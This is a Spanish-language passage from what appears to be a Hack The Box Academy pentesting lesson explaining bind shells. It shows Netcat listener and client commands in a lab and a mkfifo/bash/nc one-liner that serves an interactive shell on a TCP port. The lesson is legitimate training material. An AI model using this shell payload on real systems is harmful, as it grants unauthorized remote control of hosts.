En muchos casos, trabajaremos para establecer una shell en un sistema en una red local o remota. Esto significa que buscaremos usar la aplicación de emulador de terminal en nuestra caja de ataque local para controlar el sistema remoto a través de su shell. Esto se hace típicamente usando una `Bind` y/o `Reverse` shell.

---
## What Is It?

Con una bind shell, el sistema `target` tiene un listener iniciado y espera una conexión desde el sistema del pentester (caja de ataque).

### Bind Example

![image](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

Como se ve en la imagen, nos conectaríamos directamente con la `IP address` y el `port` que está escuchando en el target. Pueden haber muchos desafíos asociados con obtener una shell de esta manera. Aquí hay algunos a considerar:

- Debe haber un listener ya iniciado en el target.
- Si no hay un listener iniciado, necesitamos encontrar una manera de hacerlo.
- Los administradores típicamente configuran reglas de firewall entrantes estrictas y NAT (con implementación de PAT) en el borde de la red (de cara al público), por lo que ya deberíamos estar en la red interna.
- Los firewalls del sistema operativo (en Windows y Linux) probablemente bloquearán la mayoría de las conexiones entrantes que no estén asociadas con aplicaciones de red confiables.

Los firewalls de OS pueden ser problemáticos al establecer una shell, ya que necesitamos considerar las direcciones IP, los puertos y la herramienta que utilizamos para que nuestra conexión funcione con éxito. En el ejemplo anterior, la aplicación utilizada para iniciar el listener se llama [GNU Netcat](https://en.wikipedia.org/wiki/Netcat). `Netcat` (`nc`) se considera nuestro `Swiss-Army Knife` ya que puede funcionar sobre TCP, UDP y sockets Unix. Es capaz de usar IPv4 e IPv6, abrir y escuchar en sockets, operar como proxy e incluso manejar entrada y salida de texto. Usaríamos nc en la caja de ataque como nuestro `client`, y el target sería el `server`.

Vamos a obtener una comprensión más profunda de esto practicando con Netcat y estableciendo una conexión de bind shell con un host en la misma red sin restricciones.

---
## Practicing with GNU Netcat

Primero, necesitamos iniciar nuestra caja de ataque o Pwnbox y conectarnos al entorno de red de la Academy. Luego, asegurarnos de que nuestro target esté iniciado. En este escenario, interactuaremos con un sistema Ubuntu Linux para entender la naturaleza de una bind shell. Para hacer esto, usaremos `netcat` (`nc`) en el cliente y el servidor.

Una vez conectados al target con ssh, iniciamos un listener de Netcat:

### No. 1: Server - Target starting Netcat listener

```r
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
```

En este caso, el target será nuestro servidor y la caja de ataque será nuestro cliente. Una vez presionemos enter, el listener se inicia y espera una conexión del cliente.
De vuelta en el cliente (caja de ataque), usaremos nc para conectarnos al listener que iniciamos en el servidor.

### No. 2: Client - Attack box connecting to target

```r
nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```

Observa cómo estamos usando nc tanto en el cliente como en el servidor. En el lado del cliente, especificamos la dirección IP del servidor y el puerto que configuramos para escuchar (`7777`). Una vez que nos conectamos con éxito, podemos ver un mensaje `succeeded!` en el cliente como se muestra arriba y un mensaje `received!` en el servidor, como se ve a continuación.

### No. 3: Server - Target receiving connection from client

```r
Target@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!
```

Debes saber que esto no es una shell propiamente dicha. Es solo una sesión TCP de Netcat que hemos establecido. Podemos ver su funcionalidad escribiendo un mensaje simple en el lado del cliente y viéndolo recibido en el lado del servidor.

### No. 4: Client - Attack box sending message Hello Academy

```r
nc -nv 10.129.41.200 7777

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
Hello Academy
```

Una vez que escribamos el mensaje y presionemos enter, notaremos que el mensaje se recibe en el lado del servidor.

### No. 5: Server - Target receiving Hello Academy message

```r
Victim@server:~$ nc -lvnp 7777

Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```

Nota: Cuando estés en la red de la academy (10.129.x.x/16), podemos trabajar con otro estudiante de la academy para conectarnos a su target y practicar los conceptos presentados en este módulo.

---

## Establishing a Basic Bind Shell with Netcat

Hemos demostrado que podemos usar Netcat para enviar texto entre el cliente y el servidor, pero esto no es una bind shell porque no podemos interactuar con el sistema operativo y el sistema de archivos. Solo podemos pasar texto dentro del pipe configurado por Netcat. Vamos a usar Netcat para ofrecer nuestra shell y establecer una verdadera bind shell.

En el lado del servidor, necesitaremos especificar el `directory`, `shell`, `listener`, trabajar con algunos `pipelines`, y `input` y `output` `redirection` para asegurar que una shell en el sistema se sirva cuando el cliente intente conectarse.

### No. 1: Server - Binding a Bash shell to the TCP session

```r
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Los comandos anteriores se consideran nuestro payload, y entregamos este payload manualmente. Notaremos que los comandos y el código en nuestros payloads diferirán según el sistema operativo del host al que lo estemos entregando.

De vuelta en el cliente, usa Netcat para conectarte al servidor ahora que se está sirviendo una shell en el servidor.

### No. 2: Client - Connecting to bind shell on target

```r
nc -nv 10.129.41.200 7777

Target@server:~$
```

Notaremos que hemos establecido con éxito una sesión de bind shell con el target. Ten en cuenta que teníamos control total sobre nuestra caja de ataque y el sistema target en este escenario, lo cual no es típico. Trabajamos en estos ejercicios para entender los fundamentos de la bind shell y cómo funciona sin ningún control de seguridad (routers con NAT habilitado, firewalls de hardware, Web Application Firewalls, IDS, IPS, firewalls de OS, protección de endpoint, mecanismos de autenticación, etc.) en su lugar o exploits necesarios. Esta comprensión fundamental será útil a medida que entremos en situaciones más desafiantes y escenarios realistas trabajando con sistemas vulnerables.

Como se mencionó anteriormente en esta sección, también es bueno recordar que la bind shell es mucho más fácil de defender. Dado que la conexión será recibida de manera entrante, es más probable que sea detectada y bloqueada por firewalls incluso si se usan puertos estándar al iniciar un listener. Hay formas de evitar esto utilizando una reverse shell, que discutiremos en la siguiente sección.

Ahora, pongamos a prueba nuestra comprensión de estos conceptos con algunas preguntas de desafío.